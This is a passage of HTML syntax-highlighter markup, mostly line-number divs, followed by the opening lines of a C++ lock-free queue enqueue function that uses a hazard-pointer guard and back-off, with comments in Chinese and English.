&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-75&quot;&gt;75&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-76&quot;&gt;76&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-77&quot;&gt;77&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-78&quot;&gt;78&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-79&quot;&gt;79&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-80&quot;&gt;80&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-81&quot;&gt;81&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-82&quot;&gt;82&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-83&quot;&gt;83&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-84&quot;&gt;84&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-85&quot;&gt;85&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-86&quot;&gt;86&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-87&quot;&gt;87&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-88&quot;&gt;88&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-89&quot;&gt;89&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-90&quot;&gt;90&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-91&quot;&gt;91&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-92&quot;&gt;92&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-93&quot;&gt;93&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-94&quot;&gt;94&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-95&quot;&gt;95&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-96&quot;&gt;96&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-97&quot;&gt;97&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-98&quot;&gt;98&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-99&quot;&gt;99&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-100&quot;&gt;100&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-101&quot;&gt;101&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-102&quot;&gt;102&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-103&quot;&gt;103&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-104&quot;&gt;104&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-105&quot;&gt;105&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-106&quot;&gt;106&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-107&quot;&gt;107&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-108&quot;&gt;108&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-109&quot;&gt;109&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-110&quot;&gt;110&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-111&quot;&gt;111&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-112&quot;&gt;112&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-113&quot;&gt;113&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-114&quot;&gt;114&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-115&quot;&gt;115&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-116&quot;&gt;116&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-117&quot;&gt;117&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-118&quot;&gt;118&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-119&quot;&gt;119&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-120&quot;&gt;120&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-121&quot;&gt;121&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-122&quot;&gt;122&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-123&quot;&gt;123&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-124&quot;&gt;124&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-125&quot;&gt;125&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-126&quot;&gt;126&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-127&quot;&gt;127&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-128&quot;&gt;128&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-129&quot;&gt;129&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-130&quot;&gt;130&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-131&quot;&gt;131&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-132&quot;&gt;132&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-133&quot;&gt;133&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-134&quot;&gt;134&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-135&quot;&gt;135&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-136&quot;&gt;136&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-137&quot;&gt;137&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-138&quot;&gt;138&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-139&quot;&gt;139&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-140&quot;&gt;140&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-141&quot;&gt;141&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-142&quot;&gt;142&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-143&quot;&gt;143&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-144&quot;&gt;144&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-145&quot;&gt;145&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-146&quot;&gt;146&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-147&quot;&gt;147&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-148&quot;&gt;148&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-149&quot;&gt;149&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-150&quot;&gt;150&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-151&quot;&gt;151&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-152&quot;&gt;152&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-153&quot;&gt;153&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-154&quot;&gt;154&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-155&quot;&gt;155&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0d8439235974-156&quot;&gt;156&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;enqueue&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;value_type&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-2&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-4&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;         实现细节：NODE_TYPE和VALUE_TYPE-&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-5&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;        是不一样的，因此需要类型转换。&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-6&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;       为了简单起见，我们假定node_traits :: to_node_ptr -&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-7&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;      仅仅是的static_cast&amp;amp;lt;node_type *&amp;amp;gt;( &amp;amp;amp;val )&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-8&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;   */&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pNew&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_traits&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;to_node_ptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;typename &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Guard &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guard&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// A guard, for example, Hazard Pointer&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Back-off strategy (of the template-argument class)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;back_off &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bkoff&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;node_type *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// As always in lock-free, we’ll deal with it, till we make the right thing...&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;/*&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0d8439235974-18&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;            保护m_pTail, 在读取该字段时&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0d8439235974-19&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;          可以规避已删除内存被读的情形&lt;/span&gt;&lt;/div&gt;
